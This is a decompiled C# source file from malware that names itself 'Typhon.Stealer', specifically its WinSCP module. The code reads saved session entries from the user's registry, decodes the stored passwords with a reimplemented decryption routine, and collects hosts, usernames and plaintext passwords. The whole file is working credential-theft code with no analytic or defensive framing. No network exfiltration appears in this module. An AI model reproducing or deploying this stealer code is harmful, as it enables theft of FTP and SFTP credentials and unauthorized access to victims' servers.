using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using Microsoft.Win32;
using Typhon.Modules.Miscellaneous;

namespace Typhon.Stealer.Software.FTP
{
	// Token: 0x02000021 RID: 33
	internal class WinSCP
	{
		// Token: 0x0600008A RID: 138 RVA: 0x00005D88 File Offset: 0x00003F88
		public static List<DataModels.Password> GetWinSCPPasswords()
		{
			List<DataModels.Password> list = new List<DataModels.Password>();
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Martin Prikryl\\WinSCP 2\\Sessions"))
				{
					if (registryKey != null)
					{
						foreach (string path in registryKey.GetSubKeyNames())
						{
							string name = Path.Combine("Software\\Martin Prikryl\\WinSCP 2\\Sessions", path);
							using (RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey(name))
							{
								if (registryKey2 != null)
								{
									object value = registryKey2.GetValue("HostName");
									string text = (value != null) ? value.ToString() : null;
									if (!string.IsNullOrWhiteSpace(text))
									{
										DataModels.Password item = default(DataModels.Password);
										object value2 = registryKey2.GetValue("UserName");
										string user = (value2 != null) ? value2.ToString() : null;
										object value3 = registryKey2.GetValue("Password");
										string sPassword = WinSCP.DecryptPassword(user, (value3 != null) ? value3.ToString() : null, text);
										string str = text;
										string str2 = ":";
										object value4 = registryKey2.GetValue("PortNumber");
										string sUrl = str + str2 + ((value4 != null) ? value4.ToString() : null);
										item.sUrl = sUrl;
										item.sPassword = sPassword;
										object value5 = registryKey2.GetValue("UserName");
										item.sUsername = ((value5 != null) ? value5.ToString() : null);
										list.Add(item);
									}
								}
							}
						}
					}
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x0600008B RID: 139 RVA: 0x00005F28 File Offset: 0x00004128
		private static int DecryptNextChar(List<string> list)
		{
			return 255 ^ (((int.Parse(list[0]) << 4) + int.Parse(list[1]) ^ 163) & 255);
		}

		// Token: 0x0600008C RID: 140 RVA: 0x00005F58 File Offset: 0x00004158
		private static string DecryptPassword(string user, string pass, string host)
		{
			string result;
			try
			{
				if (user == string.Empty || pass == string.Empty || host == string.Empty)
				{
					result = "";
				}
				else
				{
					List<string> list = (from keyf in pass
					select keyf.ToString()).ToList<string>();
					List<string> list2 = new List<string>();
					for (int i = 0; i < list.Count; i++)
					{
						if (list[i] == "A")
						{
							list2.Add("10");
						}
						if (list[i] == "B")
						{
							list2.Add("11");
						}
						if (list[i] == "C")
						{
							list2.Add("12");
						}
						if (list[i] == "D")
						{
							list2.Add("13");
						}
						if (list[i] == "E")
						{
							list2.Add("14");
						}
						if (list[i] == "F")
						{
							list2.Add("15");
						}
						if ("ABCDEF".IndexOf(list[i]) == -1)
						{
							list2.Add(list[i]);
						}
					}
					List<string> list3 = list2;
					if (WinSCP.DecryptNextChar(list3) == 255)
					{
						WinSCP.DecryptNextChar(list3);
					}
					list3.Remove(list3[0]);
					list3.Remove(list3[0]);
					list3.Remove(list3[0]);
					list3.Remove(list3[0]);
					int num = WinSCP.DecryptNextChar(list3);
					List<string> list4 = list3;
					list4.Remove(list4[0]);
					list4.Remove(list4[0]);
					int num2 = WinSCP.DecryptNextChar(list3) * 2;
					for (int j = 0; j < num2; j++)
					{
						list3.Remove(list3[0]);
					}
					string text = "";
					for (int k = -1; k < num; k++)
					{
						string str = ((char)WinSCP.DecryptNextChar(list3)).ToString();
						list3.Remove(list3[0]);
						list3.Remove(list3[0]);
						text += str;
					}
					string text2 = user + host;
					int count = text.IndexOf(text2, StringComparison.Ordinal);
					result = text.Remove(0, count).Replace(text2, "");
				}
			}
			catch
			{
				result = "";
			}
			return result;
		}
	}
}
